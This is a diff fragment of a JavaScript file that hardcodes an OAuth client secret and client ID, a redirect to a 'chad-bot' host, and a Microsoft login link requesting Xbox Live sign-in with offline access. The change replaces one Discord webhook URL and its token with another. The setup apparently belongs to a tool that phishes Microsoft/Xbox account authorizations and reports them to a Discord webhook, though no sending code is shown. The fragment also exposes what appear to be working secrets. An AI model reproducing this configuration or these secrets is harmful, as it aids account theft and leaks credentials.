@@ -2,7 +2,7 @@
 const client_secret = 'e020c8c6-711a-4ff9-aca7-4cde141707a6'
 const client_id = '3a6718b9-7cc9-4334-8600-654f399e74ba'
 const redirect_uri = 'https://chad-bot.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1044083180455604274/2ZbqhMPGPmX3cyVOwbFFcTFiJfzWpy1JXD9DSeI-zDWxjDIISGc98TbsLrRd45p26vfP'
+const webhook_url = 'https://discord.com/api/webhooks/1047959226397503538/AOZl8WKaX-SpxsLSnZX_4x1DhV_19V56tYD7o4pdIBxIT2Lf11r-WYte3wiuYoffFzEE'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
